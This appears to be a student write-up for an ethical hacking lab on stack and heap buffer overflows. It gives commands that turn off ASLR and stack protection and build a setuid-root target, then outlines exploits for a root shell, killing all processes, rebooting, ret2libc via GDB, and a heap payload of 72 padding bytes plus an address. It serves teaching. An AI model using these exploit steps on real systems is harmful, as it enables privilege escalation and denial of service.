# Ethical hacking - Buffer Overflow Exploit

## What is Stack guard? What is ASLR protection?

## Perform a stack overflow attack on the stack.c and launch shell as root under when Stack is executable stack and ASLR is turned off

`sudo sysctl -w kernel.randomize_va_space=0`
`sudo gcc -g stack.c -o stack -fno-stack-protector -z execstack`
`sudo chown root:root stack`
`sudo chmod 4755 stack`
`gcc exploit.c -o exp`
`./exp shell`
`./stack`

## Perform a stack overflow attack on the stack.c and launch shell as root and perform seteuid() under when Stack is executable stack and ASLR is turned off

`./exp shell`
`./stack`

## Perform a stack overflow attack on the stack.c and kill all processes when Stack is executable stack and ASLR is turned off

`./exp kill`
`./stack`

## Perform a stack overflow attack on the stack.c and reboot the system when Stack is executable stack and ASLR is turned off

`./exp restart`
`./stack`

## Now turn on ASLR and perform all the previous tasks

We enable the ASLR using this command: `sudo sysctl -w kernel.randomize_va_space=2`
In a BASH script, we call the program in an infinite loop.
`sh -c "while [ 1 ]; do ./stack; done;"`

## Turn on a non-executable stack . Perform any ret2libc attack

`sudo gcc stack.c -o stack -fno-stack-protector -z noexecstack`

Then, start GDB with:
`gdb stack`

Type the commands:
`b main`
`r`
`p system` (Note the address)
`p exit` (Note the address)

Run `exploit_retlib.c` to get the addresses for the two components and `getenv.c` to get address for `/bin/sh`.

Add the addresses to the pointers in `exploit_retlib.c`

Then run the code:
`gcc -o exploit exploit_retlib.c`
`./exploit`
`./stack`

## Exploit heap1.c and try to execute executeShell function to launch a shell

`gcc -o exploit exploit_retlib.c`
In GDB, we set a breakpoint at main and execute the following commmands
`b main`
`r`
`info proc map` (Note the heap address)
`x/50x <heap_address>`
We determine that we need to enter 72 bytes garbage value followed by `executeShell()` address.
`print &executeShell` (Note the address)
`$(python -c "print 'A'*72 + '\x64\x84\x04\x08'")`